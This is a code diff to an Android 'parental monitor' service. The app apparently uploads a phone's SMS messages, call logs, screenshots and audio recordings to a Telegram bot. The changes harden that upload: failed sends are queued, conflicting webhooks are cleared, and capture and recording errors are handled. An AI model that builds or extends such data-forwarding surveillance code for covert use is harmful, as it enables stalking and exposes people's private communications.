@@ -154,13 +154,10 @@ class MonitoringService : Service() {
     private var shotDisplay: VirtualDisplay? = null
     private var shotReader: ImageReader? = null
     private var shotProjection: MediaProjection? = null
+    private var shotStopCallback: MediaProjection.Callback? = null
+    private var shotCallbackProjection: MediaProjection? = null
     private var shotWidth = 0
     private var shotHeight = 0
-    private val shotStopCallback = object : MediaProjection.Callback() {
-        override fun onStop() {
-            releaseShotSession()
-        }
-    }
 
     private enum class MediaSendOutcome {
         SENT, KEPT, DROPPED
@@ -1109,6 +1106,10 @@ class MonitoringService : Service() {
     @Volatile
     private var updateConflictNoticeAt = 0L
     @Volatile
+    private var webhookClearAt = 0L
+    @Volatile
+    private var webhookClearNoticeAt = 0L
+    @Volatile
     private var offsetFailCount = 0
     @Volatile
     private var mediaBackoffUntil = 0L
@@ -1188,6 +1189,35 @@ class MonitoringService : Service() {
         return "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22channel_post%22,%22edited_channel_post%22,%22callback_query%22%5D"
     }
 
+    private suspend fun clearStaleWebhook(botToken: String) {
+        val cleared = try {
+            val url = "https://api.telegram.org/bot$botToken/deleteWebhook"
+            val resp = TelegramClient.api.deleteWebhook(url, emptyMap())
+            resp.isSuccessful && resp.body()?.ok == true
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
+        } catch (_: Exception) {
+            false
+        }
+        val now = System.currentTimeMillis()
+        if (cleared) {
+            commandBackoffUntil = 0L
+            if (now - webhookClearNoticeAt > 3_600_000L) {
+                webhookClearNoticeAt = now
+                try {
+                    sendToTelegram("🔗 Webhook bot lama dibersihkan; perintah Telegram aktif lagi.")
+                } catch (_: Exception) {
+                }
+            }
+        } else if (now - updateConflictNoticeAt > 3_600_000L) {
+            updateConflictNoticeAt = now
+            try {
+                sendToTelegram("Konflik polling bot (409): klien lain sedang membaca pembaruan, perintah tertunda. Hentikan klien polling lain.")
+            } catch (_: Exception) {
+            }
+        }
+    }
+
     private suspend fun pollTelegramCommands(): Boolean {
         if (android.os.SystemClock.elapsedRealtime() < commandBackoffUntil) return false
         if (NetworkUtils.isPollBlocked(preferencesManager)) return false
@@ -1243,15 +1273,17 @@ class MonitoringService : Service() {
             android.util.Log.w("MonitoringService", "getUpdates conflict: another consumer is polling, backing off")
             commandBackoffUntil = now409 + (if (selfConflict) 60_000L else 300_000L)
             idlePolls = 4
-            try {
-                val nowConflict = System.currentTimeMillis()
-                if (!selfConflict && nowConflict - updateConflictNoticeAt > 3_600_000L) {
-                    updateConflictNoticeAt = nowConflict
+            if (!selfConflict) {
+                val nowClear = System.currentTimeMillis()
+                if (nowClear - webhookClearAt > 10 * 60_000L) {
+                    webhookClearAt = nowClear
                     serviceScope.launch {
-                        sendToTelegram("Konflik polling bot (409): klien lain sedang membaca pembaruan, perintah tertunda. Hentikan klien polling lain.")
+                        try {
+                            clearStaleWebhook(botToken)
+                        } catch (_: Exception) {
+                        }
                     }
                 }
-            } catch (_: Exception) {
             }
             return false
         }
@@ -3448,11 +3480,8 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    val sentSmsPart = sendFitted(message, queueOnFail = false)
-                    if (!sentSmsPart) {
-                        initialOk = false
-                        break
-                    }
+                    val sentSmsPart = sendFitted(message, queueOnFail = true)
+                    if (!sentSmsPart) initialOk = false
                     try {
                         preferencesManager.setSmsCursorSync(maxOf(preferencesManager.lastSmsId, part.maxOf { it.id }))
                     } catch (_: Exception) {
@@ -3480,11 +3509,8 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    val sentCallPart = sendFitted(message, queueOnFail = false)
-                    if (!sentCallPart) {
-                        initialOk = false
-                        break
-                    }
+                    val sentCallPart = sendFitted(message, queueOnFail = true)
+                    if (!sentCallPart) initialOk = false
                     try {
                         val latest = part.maxWith(compareBy({ it.date }, { it.id }))
                         if (latest.date > preferencesManager.lastCallTimestamp ||
@@ -3560,14 +3586,12 @@ class MonitoringService : Service() {
                 val freqMap = try { batchFreqMap() } catch (_: Exception) { null }
                 val knownMap = try { smsPage.map { it.address }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                 for (part in smsPage.chunked(10)) {
-                    val sentSms = sendFitted(formatSmsMessage(part, freqMap, knownMap), queueOnFail = false)
+                    val sentSms = sendFitted(formatSmsMessage(part, freqMap, knownMap), queueOnFail = true)
+                    smsCursor = maxOf(smsCursor, part.maxOf { it.id })
+                    try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
                     if (sentSms) {
-                        smsCursor = maxOf(smsCursor, part.maxOf { it.id })
-                        try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
                         smsSentAny = true
                         found = true
-                    } else {
-                        break
                     }
                 }
                 if (smsSentAny) {
@@ -3590,10 +3614,7 @@ class MonitoringService : Service() {
                 var callSentAny = false
                 val callKnown = try { callPage.map { it.number }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                 for (part in callPage.chunked(10)) {
-                    val sentCall = sendFitted(formatCallMessage(part, callKnown), queueOnFail = false)
-                    if (!sentCall) {
-                        break
-                    }
+                    val sentCall = sendFitted(formatCallMessage(part, callKnown), queueOnFail = true)
                     try {
                         val latest = part.maxWith(compareBy({ it.date }, { it.id }))
                         if (latest.date > preferencesManager.lastCallTimestamp ||
@@ -3603,8 +3624,10 @@ class MonitoringService : Service() {
                         }
                     } catch (_: Exception) {
                     }
-                    callSentAny = true
-                    found = true
+                    if (sentCall) {
+                        callSentAny = true
+                        found = true
+                    }
                 }
                 if (callSentAny) {
                     try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
@@ -5111,8 +5134,14 @@ class MonitoringService : Service() {
                 val parts = curfew.split(":")
                 val ch = parts[0].toIntOrNull() ?: -1
                 val cm = parts[1].toIntOrNull() ?: -1
-                val pastMidnight = h < 5 && ch >= 12
-                inCurfew = ch >= 0 && (h > ch || (h == ch && cal.get(java.util.Calendar.MINUTE) >= cm) || pastMidnight)
+                val startMin = ch * 60 + cm
+                val nowMin = h * 60 + cal.get(java.util.Calendar.MINUTE)
+                val morningEnd = 5 * 60
+                inCurfew = ch in 0..23 && cm in 0..59 && if (startMin >= morningEnd) {
+                    nowMin >= startMin || nowMin < morningEnd
+                } else {
+                    nowMin >= startMin && nowMin < morningEnd
+                }
             }
             val inSchool = day != java.util.Calendar.SATURDAY && day != java.util.Calendar.SUNDAY && h in 8..15
             if (!inCurfew && !inSchool) return
@@ -6033,10 +6062,17 @@ class MonitoringService : Service() {
     }
 
     private fun releaseShotSession() {
-        val projection = com.redeye.parentalmonitor.utils.ScreenCapture.current()
+        var callback: MediaProjection.Callback? = null
+        var projection: MediaProjection? = null
+        synchronized(shotSessionLock) {
+            callback = shotStopCallback
+            projection = shotCallbackProjection
+            shotStopCallback = null
+            shotCallbackProjection = null
+        }
         releaseShotSurface()
         try {
-            if (projection != null) projection.unregisterCallback(shotStopCallback)
+            if (projection != null && callback != null) projection.unregisterCallback(callback)
         } catch (_: Exception) {
         }
         val pending = try { com.redeye.parentalmonitor.utils.ScreenCapture.request() } catch (_: Exception) { null }
@@ -6062,13 +6098,24 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.utils.ScreenCapture.revoke()
             return null
         }
+        val stopCallback = object : MediaProjection.Callback() {
+            override fun onStop() {
+                var current = false
+                synchronized(shotSessionLock) { current = shotCallbackProjection === acquired }
+                if (current) releaseShotSession()
+            }
+        }
         try {
-            acquired.registerCallback(shotStopCallback, android.os.Handler(android.os.Looper.getMainLooper()))
+            acquired.registerCallback(stopCallback, android.os.Handler(android.os.Looper.getMainLooper()))
         } catch (e: Exception) {
             android.util.Log.w("MonitoringService", "registerCallback tangkap layar gagal: " + redactToken(e.message))
             try { acquired.stop() } catch (_: Exception) { }
             com.redeye.parentalmonitor.utils.ScreenCapture.revoke()
             return null
+        }
+        synchronized(shotSessionLock) {
+            shotStopCallback = stopCallback
+            shotCallbackProjection = acquired
         }
         com.redeye.parentalmonitor.utils.ScreenCapture.adopt(acquired)
         return acquired
@@ -7041,9 +7088,19 @@ class MonitoringService : Service() {
             recorderActive.set(true)
             recorder.start()
             kotlinx.coroutines.delay(seconds * 1000L)
+            var stopOk = true
             try {
                 recorder.stop()
             } catch (_: Exception) {
+                stopOk = false
+            }
+            if (!stopOk) {
+                try {
+                    deleteQuietly(audioFile)
+                } catch (_: Exception) {
+                }
+                sendToTelegram("Gagal merekam (rekaman tidak final). Coba lagi.")
+                return
             }
             if (!audioFile.exists() || audioFile.length() == 0L) {
                 try {
@@ -7107,7 +7164,7 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                 }
             } else {
-                try { deleteQuietly(audioFile) } catch (_: Exception) { }
+                keepForRetry = try { audioFile.exists() && audioFile.length() > 0L } catch (_: Exception) { false }
             }
             throw e
         } catch (e: SecurityException) {
